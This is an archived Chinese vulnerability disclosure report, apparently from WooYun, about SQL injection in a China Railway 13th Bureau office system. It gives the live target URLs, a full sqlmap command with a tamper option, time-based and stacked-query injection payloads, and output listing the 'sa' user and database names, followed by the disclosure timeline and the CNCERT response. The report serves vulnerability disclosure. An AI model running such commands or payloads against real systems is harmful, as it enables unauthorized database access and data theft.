wybug_title: 中铁十三局某系统存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-13：	细节已通知厂商并且等待厂商处理中									2015-07-17：	厂商已经确认，细节仅向厂商公开									2015-07-27：	细节向核心白帽子及相关领域专家公开									2015-08-06：	细节向普通白帽子公开									2015-08-16：	细节向实习白帽子公开									2015-08-31：	细节向公众公开  简要描述： 中铁十三局某系统存在SQl注入漏洞。 详细说明：  中铁13局办公系统存在SQL注入，大量数据。地址：http://oa.cr13g.com/c6/Jhsoft.Web.login/PassWord.aspx注入地址：http://oa.cr13g.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123
python sqlmap.py -u "http://oa.cr13g.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123" --dbms "mssql" --tamper "space2comment.py" --users --dbs

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: FileID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: FileID=12'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: FileID=12' WAITFOR DELAY '0:0:5'-----[21:21:17] [INFO] changes made by tampering scripts are not included in shown payload content(s)[21:21:17] [INFO] testing Microsoft SQL Server[21:21:17] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, plea[21:21:25] [INFO] confirming Microsoft SQL Server[21:21:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 1.1.4322back-end DBMS: Microsoft SQL Server 2005[21:21:25] [INFO] fetching database users[21:21:25] [INFO] fetching number of database users[21:21:25] [INFO] resumed: 1[21:21:25] [INFO] resumed: sadatabase management system users [1]:[*] sa[21:21:25] [INFO] fetching database names[21:21:25] [INFO] fetching number of databases[21:21:25] [INFO] resumed: 14[21:21:25] [INFO] resumed: C6[21:21:25] [INFO] resumed: Crcc[21:21:25] [INFO] resumed: CWBRlzy[21:21:25] [INFO] resumed: master[21:21:25] [INFO] resumed: model[21:21:25] [INFO] resumed: msdb[21:21:25] [INFO] resumed: OA[21:21:25] [INFO] resumed: Office[21:21:25] [INFO] resumed: ReportServer[21:21:25] [INFO] resumed: ReportServerTempDB[21:21:25] [INFO] resumed: Rlzy[21:21:25] [INFO] resumed: Rlzy1[21:21:25] [INFO] resumed: tempdb[21:21:25] [INFO] resumed: ZBQCavailable databases [14]:[*] C6[*] Crcc[*] CWBRlzy[*] master[*] model[*] msdb[*] OA[*] Office[*] ReportServer[*] ReportServerTempDB[*] Rlzy[*] Rlzy1[*] tempdb[*] ZBQC
好了就这些吧不再深入   漏洞证明：  中铁13局办公系统存在SQL注入，大量数据。地址：http://oa.cr13g.com/c6/Jhsoft.Web.login/PassWord.aspx注入地址：http://oa.cr13g.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123
python sqlmap.py -u "http://oa.cr13g.com/c6/JHSoft.Web.customquery/UploadImageDownLoadIn.aspx?FileID=123" --dbms "mssql" --tamper "space2comment.py" --users --dbs

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-07-17 11:48 厂商回复： CNVD未直接复现所述情况，按照漏洞报送者所述情况整理通报，转由CNCERT下发给天津分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
